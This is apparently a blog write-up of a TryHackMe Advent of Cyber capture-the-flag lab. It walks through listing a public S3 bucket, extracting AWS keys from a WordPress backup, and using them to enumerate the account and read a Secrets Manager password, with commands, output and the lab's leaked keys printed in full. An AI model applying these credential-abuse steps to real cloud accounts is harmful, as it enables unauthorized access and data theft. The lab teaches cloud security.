---
title: Advent Of Cyber 3 - Day 17
date: "2021-12-17"
description: Cloud attacks, AWS
tldr: AWS
tags: [aws,tryhackme,adventofcyber3,cloud]

---

## Getting ready

Today it's about exploring and exploiting AWS S3 buckets, using it to extract information and use that to gain further leverage.

Get the AWS CLI: 
```shell 
sudo apt install -y awscli
```

verify that it works: 
```shell
aws s3 ls s3://irs-form-990/ --no-sign-request
```

it should start printing a long list with dates and XML files, hit CTRL+C after a while because it's a pretty long list.

## Downloading stuff

Using cURL or aws-cli

```shell
curl http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml

aws s3 cp s3://irs-form-990/201101319349101615_public.xml . --no-sign-request
```


## AWS recon

```shell
aws configure --profile (PROFILENAME)
```

adds files to `.aws/config` and `.aws/credentials` in the home-dir.

after adding the access keys to the profile, commands can be executed with: 

```shell
aws s3 ls --profile (PROFILENAME)
```

OBS! Never store a set of access keys in the default profile, the risk of running commands on the wrong account is smaller this way.

other recon techniques: 

Finding the account ID belonging to an access key: `aws sts get-access-key-info --access-key-id AKIAEXAMPLE`

Determining the Username the access key you're using belongs to: `aws sts get-caller-identity --profile (PROFILENAME)`

Listing all the EC2 instances running in an account: `aws ec2 describe-instances --output text --profile (PROFILENAME)`

Listing all the EC2 instances running in an account in a different region: `aws ec2 describe-instances --output text --region us-east-1 --profile (PROFILENAME)`


## AWS ARN
identifying a unique identifier, the format is: 
`arn:aws:<service>:<region>:<account_id>:<resource_type>/<resource_name>`


## Challenge

The grinch got hold of too much information again somehow, and we need to find out how.

the clue is an image HR sent out about a new portal site: 

![thm-aoc3-day17](thm-aoc3-day17-1.png)

looking at the source code it links to: 

```html
<img src="https://s3.amazonaws.com/images.bestfestivalcompany.com/flyer.png" style="width:538px">
```

where the bucket seems to be: `images.bestfestivalcompany.com`

lets see if we can enumerate it a bit and list some more files. 

```shell
┌──(kryssar㉿kali)-[/mnt/hgfs/VMSHARED/tryhackme]
└─$ aws s3 ls s3://images.bestfestivalcompany.com --no-sign-request

2021-11-13 16:06:51       6148 .DS_Store
2021-11-13 13:43:03     108420 0vF39p3.png
2021-11-27 12:55:21     705191 AWSConsole.png
2021-11-13 13:43:03       5652 aws-logo.png
2021-11-13 16:06:51         68 flag.txt
2021-11-13 16:06:51    2349068 flyer.png
2021-11-13 13:43:03      92531 presents.jpg
2021-11-13 13:43:03       4680 tree.png
2021-11-24 00:52:22   16556739 wp-backup.zip
```

there seems to be a couple of intresting files, lets download them and analyze further:

```shell
┌──(kryssar㉿kali)-[/mnt/hgfs/VMSHARED/tryhackme/day17]
└─$ aws s3 cp s3://images.bestfestivalcompany.com/ ./ --recursive --no-sign-request                             2 ⨯
download: s3://images.bestfestivalcompany.com/flag.txt to ./flag.txt
download: s3://images.bestfestivalcompany.com/aws-logo.png to ./aws-logo.png
download: s3://images.bestfestivalcompany.com/.DS_Store to ./.DS_Store
download: s3://images.bestfestivalcompany.com/tree.png to ./tree.png
download: s3://images.bestfestivalcompany.com/presents.jpg to ./presents.jpg
download: s3://images.bestfestivalcompany.com/0vF39p3.png to ./0vF39p3.png
download: s3://images.bestfestivalcompany.com/AWSConsole.png to ./AWSConsole.png
download: s3://images.bestfestivalcompany.com/flyer.png to ./flyer.png
download: s3://images.bestfestivalcompany.com/wp-backup.zip to ./wp-backup.zip
```

contents of `flag.txt` : `It's easy to get your elves data when you leave it so easy to find!`

the interesting file we want to investigate more is: `wp-backup.zip`

unzip the `wp-backup.zip` file and go through the files. Inside the unpacked folder is a file called `wp-config.php` and it has some juicy credentials: 

```php
/* Add any custom values between this line and the "stop editing" line. */
define('S3_UPLOADS_BUCKET', 'images.bestfestivalcompany.com');
define('S3_UPLOADS_KEY', 'AKIAQI52OJVCPZXFYAOI');
define('S3_UPLOADS_SECRET', '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');
define('S3_UPLOADS_REGION', 'us-east-1');
```

AWS Access Key ID: `AKIAQI52OJVCPZXFYAOI`

Finding the AWS Account ID the access-key works with: 
```shell 
┌──(kryssar㉿kali)-[/mnt/…/tryhackme/day17/wp_backup/wp-admin]
└─$ aws configure --profile thm-day17

AWS Access Key ID [None]: AKIAQI52OJVCPZXFYAOI
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]:

aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI--profile thm-day17
{
    "Account": "019181489476"
}
```

Finding the Username of the account: 
```shell
aws sts get-caller-identity --profile thm-day17
{
    "UserId": "AIDAQI52OJVCFHT3E73BO",
    "Account": "019181489476",
    "Arn": "arn:aws:iam::019181489476:user/ElfMcHR@bfc.com"
}
```

Username: `ElfMcHR@bfc.com`

Find the name of the EC2 instance: 
```shell
aws ec2 describe-instances --output text --profile thm-day17

<snip>
TAGS    aws:cloudformation:stack-id     arn:aws:cloudformation:us-east-1:019181489476:stack/HR-Portal/5ebc4e90-447e-11ec-a711-12d63f44d7b7
TAGS    aws:cloudformation:logical-id   Instance
TAGS    created_by      Elf McHR
TAGS    aws:cloudformation:stack-name   HR-Portal
TAGS    Name    HR-Portal
```

the interesting parts are under `TAGS` , where we see that the name is `HR-Portal`

finding the database password stored in Secrets Manager: 
```shell
aws secretsmanager list-secrets --profile thm-day17
{                                                            
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:019181489476:secret:HR-Password-8AkWYF",
            "Name": "HR-Password",                                               
            "Description": "Portal DB Secret",
            "LastChangedDate": 1637717347.812,
            "LastAccessedDate": 1639872000.0,
            "Tags": [
                {
                    "Key": "aws:cloudformation:stack-name",
                    "Value": "HR-Portal" 
                },
                {
                    "Key": "aws:cloudformation:logical-id",
                    "Value": "FalseSecret"
                },
                {
                    "Key": "aws:cloudformation:stack-id",
                    "Value": "arn:aws:cloudformation:us-east-1:019181489476:stack/HR-Portal/5ebc4e90-447e-11ec-a711-12d63f44d7b7"
                },
                {
                    "Key": "created_by", 
                    "Value": "Elf McHR"
                },
                {
                    "Key": "Name",
                    "Value": "Payroll"
                }
            ],
            "SecretVersionsToStages": {
                "70630b3c-4fbe-4a24-885d-18445bd808b1": [
                    "AWSCURRENT"
                ],
                "a702190e-69f7-4a8a-81fd-3d20b486657a": [
                    "AWSPREVIOUS"
                ]
            },
            "CreatedDate": 1636807016.521
        }
    ]
}

aws secretsmanager get-secret-value --secret-id HR-Password
{
    "ARN": "arn:aws:secretsmanager:us-east-1:019181489476:secret:HR-Password-8AkWYF",
    "Name": "HR-Password",
    "VersionId": "70630b3c-4fbe-4a24-885d-18445bd808b1",
    "SecretString": "The Secret you're looking for is not in this **REGION**. Santa wants to have low latency to his databases. Look closer to where he lives.",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1637717347.718
}
```

Sneaky santa keeping the DB close, time to find a datacenter closer to the north-pole. Going by the list on [aws-docs](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Concepts.RegionsAndAvailabilityZones.html) the region `eu-north-1` should be closer to where santa is. 

```shell
┌──(kryssar㉿kali)-[/mnt/hgfs/VMSHARED/tryhackme/day17]
└─$ aws secretsmanager get-secret-value --secret-id HR-Password --region eu-north-1
{
    "ARN": "arn:aws:secretsmanager:eu-north-1:019181489476:secret:HR-Password-KIJEvK",
    "Name": "HR-Password",
    "VersionId": "f806c3cd-ea20-4a1a-948f-80927f3ad366",
    "SecretString": "Winter2021!",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1636809979.996
}
```

What a classic password :D : `Winter2021!`

EOF